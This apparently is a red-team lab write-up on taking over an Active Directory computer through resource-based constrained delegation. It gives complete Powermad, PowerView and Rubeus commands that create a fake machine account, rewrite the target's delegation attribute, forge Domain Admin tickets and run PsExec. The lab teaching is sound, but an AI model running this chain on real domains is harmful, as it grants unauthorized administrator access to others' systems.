

It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.

This lab is based on a video presented by [@wald0](https://twitter.com/_wald0?lang=en) - <https://www.youtube.com/watch?v=RUbADHcBLKg&feature=youtu.be>

## Overview

High level overview of the attack as performed in the lab:

* We have code execution on the box `WS02` in the context of `offense\sandy` user;
* User `sandy` has `WRITE` privilege over a target computer `WS01`;
* User `sandy` creates a new computer object `FAKE01` in Active Directory (no admin required);
* User `sandy` leverages the `WRITE` privilege on the `WS01` computer object and updates its object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable the newly created computer `FAKE01` to impersonate and authenticate any domain user that can then access the target system `WS01`. In human terms this means that the target computer `WS01` is happy for the computer `FAKE01` to impersonate any domain user and give them any access (even Domain Admin privileges) to `WS01`;
* `WS01` trusts `FAKE01` due to the modified `msDS-AllowedToActOnBehalfOfOtherIdentity`;
* We request Kerberos tickets for `FAKE01$` with ability to impersonate `offense\spotless` who is a Domain Admin;
* Profit - we can now access the `c$` share of `ws01` from the computer `ws02`.

### &#x20;Kerberos Delegation vs Resource Based Kerberos Delegation

* In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
* In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.

## Requirements

|                                |                               |
| ------------------------------ | ----------------------------- |
| Target computer                | WS01                          |
| Admins on target computer      | <spotless@offense.local>      |
| Fake computer name             | FAKE01                        |
| Fake computer SID              | To be retrieved during attack |
| Fake computer password         | 123456                        |
| Windows 2012 Domain Controller | DC01                          |

Since the attack will entail creating a new computer object on the domain, let's check if users are allowed to do it - by default, a domain member usually can add up to 10 computers to the domain. To check this, we can query the root domain object and look for property `ms-ds-machineaccountquota`

```csharp
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover.png)
The attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:

```csharp
Get-DomainController
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-1.png)
Last thing to check - the target computer `WS01` object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:

```
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-2.png)
This is the attribute the above command is referring to:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-3.png)
## Creating a new Computer Object

Let's now create a new computer object for our computer `FAKE01` (as referenced earlier in the requirements table) - this is the computer that will be trusted by our target computer `WS01` later on:

```csharp
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-4.png)
Checking if the computer got created and noting its SID:

```csharp
Get-DomainComputer fake01
# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-5.png)
Create a new raw security descriptor for the `FAKE01` computer principal:

```csharp
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-6.png)
## Modifying Target Computer's AD Object

Applying the security descriptor bytes to the target `WS01` machine:

```csharp
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-7.png)
Reminder - we were able to write this because `offense\Sandy` belongs to security group `offense\Operations`, which has full control over the target computer `WS01$` although the only important one/enough is the `WRITE` privilege:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-8.png)
If our user did not have the required privileges, you could infer that from the verbose error message:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-9.png)
Once the `msDS-AllowedToActOnBehalfOfOtherIdentitity` is set, it is visible here:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-10.png)
Same can be seen this way:

```csharp
Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-11.png)
We can test if the security descriptor assigned to computer `ws01` in `msds-allowedtoactonbehalfofotheridentity` attribute refers to the `fake01$` machine:

```csharp
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
```

Note that the SID is referring to S-1-5-21-2552734371-813931464-1050690807-1154 which is the `fake01$` machine's SID - exactly what we want it to be:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-12.png)
## Execution

### Generating RC4 Hash

Let's generate the RC4 hash of the password we set for the `FAKE01` computer:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-13.png)
### Impersonation

Once we have the hash, we can now attempt to execute the attack by requesting a kerberos ticket for `fake01$` with ability to impersonate user `spotless` who is a Domain Admin:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-14.png)
Unfortunately, in my labs, I was not able to replicate the attack at first, even though according to rubeus, all the required kerberos tickets were created successfully - I could not gain remote admin on the target system `ws01`:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-15.png)
Once again, checking kerberos tickets on the system showed that I had a TGS ticket for `spotless` for the CIFS service at `ws01.offense.local`, but the attack still did not work:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-16.png)
### Trial and Error

Talking to a couple of folks who had successfully simulated this attack in their labs, we still could not figure out what the issue was. After repeating the the attack over and over and carrying out various other troubleshooting steps, I finally found what the issue was.

Note how the ticket is for the SPN `cifs/ws01.offense.local` and we get access denied when attempting to access the remote admin shares of `ws01`:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-17.png)
### Computer Take Over

Note, howerver if we request a ticket for SPN `cifs/ws01` - we can now access `C$` share of the `ws01` which means we have admin rights on the target system `WS01`:

```csharp
\\VBOXSVR\Tools\Rubeus\Rubeus.exe s4u /user:fake01$ /domain:offense.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:http/ws01 /altservice:cifs,host /ptt
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-18.png)
To further prove we have admin rights - we can write a simple file from `ws02` to `ws01` in c:\users\administrator:

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-19.png)
Additionally, check if we can remotely execute code with our noisy friend psexec:

```csharp
\\vboxsvr\tools\PsExec.exe \\ws01 cmd
```

![](../../../../assets/Kerberos%20Resource-based%20Constrained%20Delegation%20Computer%20Object%20Takeover-20.png)


[[Note that the `offense\spotless` rights are effective only on the target system - i.e. on the system that delegated (`WS01`) another computer resource (`FAKE01`) to act on the target's (`WS01`) behalf and allow to impersonate any domain user.]]

In other words, an attack can execute code/commands as `offense\spotless` only on the `WS01` machine and not on any other machine in the domain.


## References

**Wagging the Dog:** Abusing Resource-Based Constrained Delegation to Attack Active Directory
Shenanigans Labs {% embed url="<https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>" %}


**GitHub - Kevin-Robertson/Powermad:** PowerShell MachineAccountQuota and DNS exploit tools
GitHub{% embed url="<https://github.com/Kevin-Robertson/Powermad>" %}

**GitHub - PowerShellMafia/PowerSploit**: PowerSploit - A PowerShell Post-Exploitation Framework
GitHub{% embed url="<https://github.com/PowerShellMafia/PowerSploit>" %}

{% embed url="<https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/>" %}

**Resource Based Constrained Delegation abuse explained**
Decoder's Blog{% embed url="<https://decoder.cloud/2019/03/20/donkeys-guide-to-resource-based-constrained-delegation-from-standard-user-to-da/>" %}
